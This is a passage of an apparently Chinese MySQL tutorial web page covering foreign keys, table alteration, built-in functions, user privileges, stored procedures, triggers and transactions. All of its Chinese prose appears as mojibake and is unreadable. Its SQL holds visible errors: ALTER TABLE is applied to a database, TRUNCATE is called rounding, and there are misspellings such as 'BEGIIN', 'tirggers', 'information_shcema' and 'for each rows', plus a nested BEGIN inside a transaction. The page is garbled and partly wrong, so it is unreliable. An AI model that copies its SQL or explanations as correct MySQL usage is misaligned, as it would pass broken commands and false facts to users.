é™¤æˆ–æ›´æ–°çˆ¶è¡¨ä¸­çš„æ•°æ®</li><li>å¤–é”®çº¦æŸç”¨äºå­è¡¨ä¸­ï¼Œè€Œä¸”çˆ¶è¡¨ä¸å­è¡¨å¿…é¡»ä½¿ç”¨ç›¸åŒçš„å­˜å‚¨å¼•æ“</li><li>å½“ä¸€å¼ è¡¨ä¸­æœ‰å¤šä¸ªå¤–é”®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨çº¦æŸåæ¥è¿›è¡ŒåŒºåˆ†ï¼Œå¦‚æœçº¦æŸåçœç•¥ï¼Œåˆ™ç”±ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ</li><li>åˆ›å»ºå¤–é”®çº¦æŸçš„æ¡ä»¶ï¼š<pre><code>-  ä¸¤å¼ è¡¨éƒ½å¿…é¡»æ˜¯InnoDBå¼•æ“ï¼ˆMyISAMä¸æ”¯æŒå¤–é”®ï¼‰ï¼Œä¸”å®ƒä»¬æ²¡æœ‰ä¸´æ—¶è¡¨- å¤–é”®å…³è”çš„å­—æ®µå¿…é¡»æœ‰ç›¸ä¼¼çš„æ•°æ®ç±»å‹- å¤–é”®å…³è”çš„å­—æ®µå¿…é¡»å»ºç«‹äº†ç´¢å¼•</code></pre></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/create-table-foreign-keys.html" target="_blank" rel="noopener">å¤–é”®çš„å®˜æ–¹æ–‡æ¡£</a></li></ul><ol start="8"><li>åˆ é™¤æ™®é€š/å”¯ä¸€ç´¢å¼•ï¼š<code>DROP INDEX ç´¢å¼•å ON è¡¨å;</code>æˆ–<code>ALTER TABLE è¡¨å DROP INDEX å­—æ®µå;</code></li><li>åˆ é™¤ä¸»é”®ï¼š<code>ALTER TABLE è¡¨å DROP PRIMARY KEY;</code></li><li>åˆ é™¤å¤–é”®ï¼š<code>ALTER TABLE è¡¨å DROP FOREIGN KEY çº¦æŸå;</code></li><li>ä¿®æ”¹è¡¨åï¼š<code>ALTER TABLE æ—§è¡¨å RENAME TO æ–°è¡¨å;</code></li><li>ä¿®æ”¹å­—æ®µé»˜è®¤å€¼ï¼š<code>ALTER TABLE è¡¨å ALTER å­—æ®µå SET DEFAULT é»˜è®¤å€¼;</code></li><li>åˆ é™¤å­—æ®µçš„é»˜è®¤å€¼ï¼š<code>ALTER TABLE è¡¨å ALTER å­—æ®µå DROP DEFAULT;</code></li><li>ä¿®æ”¹è¡¨çš„å­—ç¬¦é›†ï¼š<code>ALTER TABLE è¡¨å DEFAULT CHARSET UTF8;</code></li></ol><h4 id="2-5-2-åº“çš„æ“ä½œ"><a href="#2-5-2-åº“çš„æ“ä½œ" class="headerlink" title="2.5.2 åº“çš„æ“ä½œ"></a>2.5.2 åº“çš„æ“ä½œ</h4><ul><li>ä¿®æ”¹åº“çš„å­—ç¬¦é›†ï¼š<code>ALTER TABLE åº“å DEFAULT CHARSET UTF8;</code></li></ul><h2 id="ä¸‰ã€å‡½æ•°"><a href="#ä¸‰ã€å‡½æ•°" class="headerlink" title="ä¸‰ã€å‡½æ•°"></a>ä¸‰ã€å‡½æ•°</h2><h3 id="3-1-å­—ç¬¦ä¸²å‡½æ•°"><a href="#3-1-å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="3.1 å­—ç¬¦ä¸²å‡½æ•°"></a>3.1 å­—ç¬¦ä¸²å‡½æ•°</h3><ul><li>æ‹¼æ¥è¾“å‡ºçš„å†…å®¹ï¼š<code>CONCAT(å­—æ®µ1ï¼Œå­—æ®µ2ï¼Œâ€¦â€¦)</code></li><li>ä»å·¦å¼€å§‹æˆªå–å­—ç¬¦ä¸²ï¼š<code>LEFT(str, length)</code></li><li>ä»å³å¼€å§‹æˆªå–å­—ç¬¦ä¸²ï¼š<code>RIGHT(str, length)</code></li><li>æˆªå–å­—ç¬¦ä¸²ï¼š<code>SUBSTRING(str, pos [,length] )</code>ï¼ˆå¯æˆªå–ä¸­æ–‡ï¼‰</li><li>å­—ç¬¦ä¸²é•¿åº¦ï¼š<code>LENGTH()</code>ï¼ˆåŒ…å«ä¸­æ–‡æ—¶è¿”å›å­—ç¬¦é›†ä¸‹ä¸­æ–‡æ‰€å é•¿åº¦ï¼‰</li><li>è¿”å›å­—ç¬¦ä¸ªæ•°ï¼š<code>CHAR_LENGTH()</code></li><li>å»é™¤å­—ç¬¦ä¸²å·¦å³çš„ç©ºæ ¼ï¼š<code>TRIM()</code></li><li>è½¬å°å†™ï¼š<code>LOWER()</code></li><li>è½¬å¤§å†™ï¼š<code>UPPER()</code></li><li>å­—ç¬¦ä¸²æ¯”è¾ƒï¼š<code>STRCMP(å­—æ®µ1ï¼Œå­—æ®µ2)</code>ï¼ˆå­—æ®µ1&lt;å­—æ®µ2è¿”å›-1ï¼Œå¦åˆ™è¿”å›1ï¼Œç›¸ç­‰è¿”å›0ï¼‰</li><li><code>SOUNDEX()</code>æ˜¯ä¸€ä¸ªå°†ä»»ä½•æ–‡æœ¬ä¸²è½¬æ¢ä¸ºæè¿°å…¶è¯­éŸ³è¡¨ç¤ºçš„å­—æ¯æ•°å­—æ¨¡å¼çš„ç®—æ³•ã€‚SOUNDEXè€ƒè™‘äº†ç±»ä¼¼çš„å‘éŸ³å­—ç¬¦å’ŒéŸ³èŠ‚ï¼Œä½¿å¾—èƒ½å¯¹å­—ç¬¦ä¸²è¿›è¡Œå‘éŸ³æ¯”è¾ƒè€Œä¸æ˜¯å­—æ¯æ¯”è¾ƒã€‚</li><li>åŠ å¯†å‡½æ•°ï¼š<code>PASSWORD(&#39;åŠ å¯†å†…å®¹&#39;)</code></li><li>MD5åŠ å¯†å‡½æ•°ï¼š<code>MD5(&#39;åŠ å¯†å†…å®¹&#39;)</code></li></ul><h3 id="3-2-æ•°å€¼å‡½æ•°"><a href="#3-2-æ•°å€¼å‡½æ•°" class="headerlink" title="3.2 æ•°å€¼å‡½æ•°"></a>3.2 æ•°å€¼å‡½æ•°</h3><ul><li>æ•°æ®ç±»å‹è½¬æ¢ï¼š<code>CONVERT(&#39;è½¬æ¢å†…å®¹&#39;ï¼Œç›®æ ‡ç±»å‹)</code></li><li>å–ä½™æ•°ï¼š<code>MOD(x,y)</code></li><li>å››èˆäº”å…¥ï¼š<code>TRUNCATE(x,y)</code></li><li>è¿›åˆ¶è½¬æ¢ï¼š<code>CONV(&#39;æ•°å€¼&#39;ï¼Œè¿›åˆ¶ï¼Œç›®æ ‡è¿›åˆ¶)</code></li><li>æ ¼å¼åŒ–ç»“æœï¼š<code>FORMAT(æ•°å€¼ï¼Œä¿ç•™å°æ•°ä½æ•°)</code></li><li>IPåœ°å€è½¬æ•°å€¼ï¼š<code>INET_ATON(&#39;IPåœ°å€&#39;)</code>ï¼ˆAddress TO Numberï¼‰</li><li>æ•°å€¼è½¬IPåœ°å€ï¼š<code>INET_NTOA(æ•°å€¼)</code>(Number TO Address)<ul><li>mysqlç”¨æ— ç¬¦å·æ•´å‹å­˜å‚¨IPv4</li></ul></li></ul><h3 id="3-3-æ—¥æœŸæ—¶é—´å‡½æ•°"><a href="#3-3-æ—¥æœŸæ—¶é—´å‡½æ•°" class="headerlink" title="3.3 æ—¥æœŸæ—¶é—´å‡½æ•°"></a>3.3 æ—¥æœŸæ—¶é—´å‡½æ•°</h3><ul><li>è·å–å½“å‰æ—¥æœŸæ—¶é—´ï¼š<code>NOW()</code></li><li>è·å–å½“å‰æ—¥æœŸï¼š<code>CURDATE()</code></li><li>è·å–UTCæ—¥æœŸï¼š<code>UTC_DATE()</code></li><li>è·å–UTCæ—¶é—´ï¼š<code>UTC_TIME()</code></li><li>è·å–å­£åº¦ï¼š<code>QUARTER(&#39;17-05-07&#39;)</code></li><li>è·å–åˆ†é’Ÿï¼š<code>MINUTE(&#39;10:23:21&#39;)</code></li><li>è·å–ç§’æ•°ï¼š<code>SECOND(&#39;10:23:21&#39;)</code></li></ul><h3 id="3-4-æ¡ä»¶åˆ¤æ–­å‡½æ•°"><a href="#3-4-æ¡ä»¶åˆ¤æ–­å‡½æ•°" class="headerlink" title="3.4 æ¡ä»¶åˆ¤æ–­å‡½æ•°"></a>3.4 æ¡ä»¶åˆ¤æ–­å‡½æ•°</h3><ul><li><code>IF(è¡¨è¾¾å¼ï¼Œå€¼1ï¼Œå€¼2)</code>ç±»ä¼¼äºä¸‰å…ƒè¿ç®—ï¼Œå¦‚æœè¡¨è¾¾å¼ç»“æœä¸ºçœŸå–å€¼1ï¼Œå¦åˆ™å–å€¼2</li><li><code>IFNULL(å€¼1ï¼Œå€¼2)</code>ä¼˜å…ˆè¿”å›énullçš„å€¼ï¼Œå¦‚<code>IFNULL(8,NULL)</code>å’Œ<code>IFNULL(NULL,8)</code>å’Œ<code>IFNULL(8,7)</code>éƒ½è¿”å›8</li></ul><h2 id="å››ã€-MySQLæƒé™"><a href="#å››ã€-MySQLæƒé™" class="headerlink" title="å››ã€ MySQLæƒé™"></a>å››ã€ MySQLæƒé™</h2><h3 id="4-1-MySQLæƒé™ç»éªŒåŸåˆ™ï¼š"><a href="#4-1-MySQLæƒé™ç»éªŒåŸåˆ™ï¼š" class="headerlink" title="4.1 MySQLæƒé™ç»éªŒåŸåˆ™ï¼š"></a>4.1 MySQLæƒé™ç»éªŒåŸåˆ™ï¼š</h3><ol><li>åªæˆäºˆæ»¡è¶³éœ€æ±‚çš„æœ€å°æƒé™ï¼›</li><li>é™åˆ¶ç™»å½•IPï¼›</li><li>ä¸ºæ¯ä¸ªç”¨æˆ·è®¾ç½®é«˜å¼ºåº¦çš„å¯†ç ï¼›</li><li>å®šæœŸæ¸…ç†ä¸éœ€è¦çš„ç”¨æˆ·ï¼Œå›æ”¶æƒé™æˆ–è€…åˆ é™¤ç”¨æˆ·ã€‚</li></ol><h3 id="4-2-å¸¸ç”¨æƒé™å‘½ä»¤"><a href="#4-2-å¸¸ç”¨æƒé™å‘½ä»¤" class="headerlink" title="4.2 å¸¸ç”¨æƒé™å‘½ä»¤"></a>4.2 å¸¸ç”¨æƒé™å‘½ä»¤</h3><ul><li>åˆ›å»ºç”¨æˆ·ï¼š<code>CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;</code>hostå¯ä¸ºIPåœ°å€æ®µæˆ–åŸŸåæˆ–%ï¼Œ%è¡¨ç¤ºä¸é™åˆ¶ç™»å½•IP</li><li>åˆ›å»ºå¹¶ç»™ç”¨æˆ·æˆæƒï¼š<br><code>mysql&gt; GRANT all|select,insert,update,delete ON dbname.tbname TO &#39;user&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION;</code><ul><li>ä¾‹å­ï¼š<br><code>mysql&gt; GRANT all ON *.* TO Jack@&#39;localhost&#39; IDENTIFIED BY &quot;p@55w0rd&quot; WITH GRANT OPTION;Query OK, 0 rows affected (0.01 sec)</code><br>è¯¥å‘½ä»¤è¡¨ç¤ºï¼šä¸ºæœ¬åœ°ç™»å½•çš„ç”¨æˆ·Jackèµ‹äºˆæ‰€æœ‰æ•°æ®åº“ä¸æ‰€æœ‰æ•°æ®è¡¨çš„æ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”å°†ç™»å½•å¯†ç è®¾ç½®ä¸ºâ€˜p@55w0rdâ€™ï¼Œè€Œä¸”å…è®¸è¯¥ç”¨æˆ·å°†è‡ªå·±æ‹¥æœ‰çš„æˆäºˆå…¶ä»–ç”¨æˆ·ã€‚</li></ul></li><li>åˆ·æ–°æƒé™ï¼š<code>mysql&gt; FLUSH PRIVILEGES;</code></li><li>æŸ¥çœ‹æƒé™ï¼š<code>mysql&gt; SHOW GRANTS [FOR &#39;jack&#39;@&#39;%&#39;];</code></li><li>æ’¤é”€æƒé™ï¼š<code>mysql&gt; REVOKE delete ON *.* FROM &#39;jack&#39;@&#39;loaclhost&#39;;</code></li><li>åˆ é™¤ç”¨æˆ·ï¼š<code>mysql&gt; DROP USER &#39;jack&#39;@&#39;localhost&#39;;</code></li><li>è´¦æˆ·é‡å‘½åï¼š<code>mysql&gt; RENAME USER &#39;jack&#39;@&#39;%&#39; TO &#39;rose&#39;@&#39;%&#39;;</code></li><li>ä¿®æ”¹è‡ªå·±å¯†ç ï¼š<code>mysql&gt; SET PASSWORD=&#39;å¯†ç &#39;;</code></li><li>ä¿®æ”¹å…¶ä»–ç”¨æˆ·å¯†ç ï¼š<code>mysql&gt; SET PASSWORD FOR &#39;jack&#39;@&#39;localhost&#39;=PASSWORD(&#39;123456&#39;);</code></li><li>æ³¨ï¼šåœ¨MySQL 5.7åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œmysql.userçš„å¯†ç å­—æ®µç”±<code>password</code>æ›´æ¢ä¸ºäº†<code>authentication_string</code><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qtnln8ej30ei07eab5.jpg" alt=""></li></ul><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qu9i6n1j30i00gu78q.jpg" alt=""></p><h2 id="äº”ã€å­˜å‚¨è¿‡ç¨‹"><a href="#äº”ã€å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="äº”ã€å­˜å‚¨è¿‡ç¨‹"></a>äº”ã€å­˜å‚¨è¿‡ç¨‹</h2><ul><li>æŸ¥çœ‹æ‰€æœ‰å­˜å‚¨è¿‡ç¨‹ï¼š<code>select name from mysql.proc;</code>æˆ–<code>select routine_name from information_schema.routines;</code></li><li>æŸ¥çœ‹æŸä¸ªæ•°æ®åº“ä¸‹çš„å­˜å‚¨è¿‡ç¨‹ï¼š<code>select name from mysql.proc where db=&#39;æ•°æ®åº“å&#39;;</code>æˆ–<code>select routine_name from information_schema.routines where routine_schema=&#39;æ•°æ®åº“å&#39;;</code></li><li>æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹çš„è¯¦ç»†å†…å®¹ï¼š<code>SHOW CREATE PROCEDURE æ•°æ®åº“.å­˜å‚¨è¿‡ç¨‹å;</code></li><li>ä¿®æ”¹å­˜å‚¨è¿‡ç¨‹ï¼š<code>ALTER PROCEDURE åç§° [ç‰¹æ€§â€¦â€¦]</code><ul><li>MySQLçš„å­˜å‚¨è¿‡ç¨‹åªèƒ½ä¿®æ”¹å…¶ç‰¹æ€§ï¼Œä¸èƒ½ä¿®æ”¹è¿‡ç¨‹ä½“ï¼Œè‹¥è¦ä¿®æ”¹è¿‡ç¨‹ä½“ï¼Œåªèƒ½åˆ é™¤åé‡æ–°åˆ›å»ºã€‚</li></ul></li><li>åˆ é™¤å­˜å‚¨è¿‡ç¨‹ï¼š<code>DROP PROCEDURE [æ•°æ®åº“.]å­˜å‚¨è¿‡ç¨‹å</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- è®¾ç½®è¯»å–testè¡¨ä¸­çš„æ•°æ®çš„å­˜å‚¨è¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> sxy;</span><br><span class="line">DELIMITER //</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sxy(<span class="keyword">IN</span> <span class="keyword">var</span> <span class="built_in">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`test`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span> = <span class="keyword">var</span>;</span><br><span class="line"><span class="keyword">END</span>//</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è°ƒç”¨å­˜å‚¨è¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">CALL</span> sxy(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="å…­ã€è§¦å‘å™¨"><a href="#å…­ã€è§¦å‘å™¨" class="headerlink" title="å…­ã€è§¦å‘å™¨"></a>å…­ã€è§¦å‘å™¨</h2><p>è§¦å‘å™¨ç»å¸¸ç”¨äºåŠ å¼ºæ•°æ®çš„å®Œæ•´æ€§çº¦æŸå’Œä¸šåŠ¡è§„åˆ™ç­‰ã€‚<br>ä¸€èˆ¬æ¥è¯´ï¼Œçº¦æŸçš„å¤„ç†é€Ÿåº¦æ¯”è§¦å‘å™¨å¿«ï¼Œå› æ­¤åº”è¯¥å°½é‡ä½¿ç”¨çº¦æŸã€‚<br>åœ¨MySQLä¸­ï¼Œåˆ›å»ºè§¦å‘å™¨çš„è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> è§¦å‘å™¨åç§° è§¦å‘æ—¶æœº(<span class="keyword">BEFORE</span>|<span class="keyword">AFTER</span>) è§¦å‘äº‹ä»¶(<span class="keyword">INSERT</span>|<span class="keyword">UPDATE</span>|<span class="keyword">DELETE</span>)  </span><br><span class="line">  <span class="keyword">ON</span> è¡¨å <span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span></span><br><span class="line">  <span class="keyword">BEGIN</span></span><br><span class="line">    è§¦å‘å™¨ç¨‹åºä½“(<span class="keyword">SQL</span>è¯­å¥)</span><br><span class="line">  <span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯è§ï¼Œå¯ä»¥å»ºç«‹6ç§è§¦å‘å™¨ï¼Œå³ï¼šBEFORE INSERTã€BEFORE UPDATEã€BEFORE DELETEã€AFTER INSERTã€AFTER UPDATEã€AFTER DELETEã€‚</p><p>å¦å¤–æœ‰ä¸€ä¸ªé™åˆ¶æ˜¯ä¸èƒ½åŒæ—¶åœ¨ä¸€ä¸ªè¡¨ä¸Šå»ºç«‹2ä¸ªç›¸åŒç±»å‹çš„è§¦å‘å™¨ï¼Œå› æ­¤åœ¨ä¸€ä¸ªè¡¨ä¸Šæœ€å¤šå»ºç«‹6ä¸ªè§¦å‘å™¨ã€‚<br>æŸ¥çœ‹è§¦å‘å™¨</p><ol><li><p>é€šè¿‡showè¯­å¥æŸ¥çœ‹è§¦å‘å™¨<br><code>SHOW TRIGGERS;</code></p></li><li><p>é€šè¿‡ç³»ç»Ÿè¡¨æŸ¥çœ‹è§¦å‘å™¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_shcema;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tirggers;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">triggers</span> <span class="keyword">where</span> TRIGGER_NAME = <span class="string">'è§¦å‘å™¨åç§°'</span>;</span><br></pre></td></tr></table></figure></li></ol><p>è§¦å‘å™¨ä¸­çš„<code>new</code>å’Œ<code>old</code></p><ol><li>é’ˆå¯¹<code>update</code>æ“ä½œï¼Œ<code>new</code>è¡¨ç¤ºçš„æ˜¯æ›´æ–°åçš„å€¼ï¼Œ<code>old</code>è¡¨ç¤ºçš„æ˜¯æ›´æ–°å‰çš„æ•°æ®ã€‚</li><li>é’ˆå¯¹<code>insert</code>æ“ä½œï¼Œ<code>new</code>è¡¨ç¤ºçš„æ˜¯æ–°å¢çš„å€¼ã€‚</li><li>é’ˆå¯¹<code>delete</code>æ“ä½œï¼Œ<code>old</code>è¡¨ç¤ºçš„æ˜¯è¢«åˆ é™¤çš„å€¼ã€‚</li></ol><p>ç¤ºä¾‹1ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ’å…¥è§¦å‘å™¨</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger tab1_after_insert after insert</span><br><span class="line">    -&gt; on tab1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;   insert into tab2(tab2_id) values(new.tab1_id);</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter ;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹2</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ é™¤è§¦å‘å™¨</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger tab1_delete_after after delete</span><br><span class="line">    -&gt; on tab1 for each rows</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;   delete from tab2 where tab2_id = old.tab1_id;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; delimiter ;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹3ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ›´æ–°å­¦ç”Ÿè¡¨çš„åŒæ—¶ä¹Ÿæ›´æ–°è®°å½•è¡¨</span></span><br><span class="line">delimiter $$</span><br><span class="line">mysql&gt; create trigger student1_update_after after update</span><br><span class="line">    -&gt; on student1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;  if new.student_id != old.student_id then</span><br><span class="line">    -&gt;   update update_student1 set student_id = new.student_id, update_date = now()</span><br><span class="line">    -&gt;   where student_id = old.student_id;</span><br><span class="line">    -&gt;  end if;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ é™¤å­¦ç”Ÿè¡¨çš„æ—¶å€™ä¹Ÿåˆ é™¤è®°å½•è¡¨</span></span><br><span class="line">mysql&gt; delimiter $$</span><br><span class="line">mysql&gt; create trigger student1_delete_before before delete</span><br><span class="line">    -&gt; on student1 for each row</span><br><span class="line">    -&gt; BEGIN</span><br><span class="line">    -&gt;  delete from update_student1</span><br><span class="line">    -&gt;  where student_id = old.student_id;</span><br><span class="line">    -&gt; END</span><br><span class="line">    -&gt; $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€äº‹åŠ¡"><a href="#ä¸ƒã€äº‹åŠ¡" class="headerlink" title="ä¸ƒã€äº‹åŠ¡"></a>ä¸ƒã€äº‹åŠ¡</h2><p>äº‹åŠ¡æ§åˆ¶è¯­å¥ï¼š</p><ul><li>BEGINæˆ–START TRANSACTIONï¼›æ˜¾ç¤ºåœ°å¼€å¯ä¸€ä¸ªäº‹åŠ¡ï¼›</li><li>COMMITï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨COMMIT WORKï¼Œä¸è¿‡äºŒè€…æ˜¯ç­‰ä»·çš„ã€‚COMMITä¼šæäº¤äº‹åŠ¡ï¼Œå¹¶ä½¿å·²å¯¹æ•°æ®åº“è¿›è¡Œçš„æ‰€æœ‰ä¿®æ”¹æˆä¸ºæ°¸ä¹…æ€§çš„ï¼›</li><li>ROLLBACKï¼›æœ‰å¯ä»¥ä½¿ç”¨ROLLBACK WORKï¼Œä¸è¿‡äºŒè€…æ˜¯ç­‰ä»·çš„ã€‚å›æ»šä¼šç»“æŸç”¨æˆ·çš„äº‹åŠ¡ï¼Œå¹¶æ’¤é”€æ­£åœ¨è¿›è¡Œçš„æ‰€æœ‰æœªæäº¤çš„ä¿®æ”¹ï¼›</li><li>SAVEPOINT identifierï¼›SAVEPOINTå…è®¸åœ¨äº‹åŠ¡ä¸­åˆ›å»ºä¸€ä¸ªä¿å­˜ç‚¹ï¼Œä¸€ä¸ªäº‹åŠ¡ä¸­å¯ä»¥æœ‰å¤šä¸ªSAVEPOINTï¼›</li><li>RELEASE SAVEPOINT identifierï¼›åˆ é™¤ä¸€ä¸ªäº‹åŠ¡çš„ä¿å­˜ç‚¹ï¼Œå½“æ²¡æœ‰æŒ‡å®šçš„ä¿å­˜ç‚¹æ—¶ï¼Œæ‰§è¡Œè¯¥è¯­å¥ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼›</li><li>ROLLBACK TO identifierï¼›æŠŠäº‹åŠ¡å›æ»šåˆ°æ ‡è®°ç‚¹ï¼›</li><li>SET TRANSACTIONï¼›ç”¨æ¥è®¾ç½®äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ã€‚InnoDBå­˜å‚¨å¼•æ“æä¾›äº‹åŠ¡çš„éš”ç¦»çº§åˆ«æœ‰READ UNCOMMITTEDã€READ COMMITTEDã€REPEATABLE READå’ŒSERIALIZABLEã€‚<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BEGIIN;<span class="comment">-- å¼€å¯äº‹åŠ¡</span></span><br><span class="line">SQLè¯­å¥1;</span><br><span class="line"><span class="keyword">SAVEPOINT</span> sql1;</span><br><span class="line">IF(SQLè¯­å¥1æ‰§è¡Œå¤±è´¥)</span><br><span class="line">  <span class="keyword">ROLLBACK</span>;<span class="comment">-- æ’¤é”€æ‰€æœ‰æ‰§è¡Œ</span></span><br><span class="line">SQLè¯­å¥2;</span><br><span class="line"><span class="keyword">SAVEPOINT</span> sql2;</span><br><span class="line">IF(SQLè¯­å¥2æ‰§è¡Œå¤±è´¥)</span><br><span class="line">  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> sql1;<span class="comment">-- æ’¤é”€éƒ¨åˆ†æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> sql1;<span class="comment">-- åˆ é™¤ä¿å­˜ç‚¹</span></span><br><span class="line"><span class="keyword">BEGIN</span>;<span class="comment">-- åµŒå¥—äº‹åŠ¡</span></span><br><span class="line">SQLè¯­å¥3;</span><br><span class="line">IF(SQLè¯­å¥3æ‰§è¡Œå¤±è´¥)</span><br><span class="line"><span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> sql2;</span><br><span class="line"><span class="keyword">COMMIT</span>;  </span><br><span class="line"><span class="keyword">COMMIT</span>;<span class="comment">-- æäº¤äº‹åŠ¡</span></span><br></pre></td></tr></table></figure>å‚è€ƒæ–‡ç« ï¼š<a href="http://www.jellythink.com/archives/952" target="_blank" rel="noopener">è¯´è¯´MySQLä¸­çš„äº‹åŠ¡</a></li></ul><h2 id="å…«ã€-MySQLä¸­çš„æ—¥å¿—"><a href="#å…«ã€-MySQLä¸­çš„æ—¥å¿—" class="headerlink" title="å…«ã€ MySQLä¸­çš„æ—¥å¿—"></a>å…«ã€ 